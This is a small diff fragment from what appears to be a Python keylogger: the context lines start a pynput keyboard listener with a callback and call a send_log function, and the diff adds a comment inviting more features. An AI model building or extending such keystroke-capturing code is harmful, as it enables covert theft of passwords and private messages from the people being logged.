@@ -30,3 +30,5 @@ keyboard_listener = pynput.keyboard.Listener(on_press=callback_function)
 with keyboard_listener:
     send_log()
     keyboard_listener.join()
+
+#keep adding your own functionality
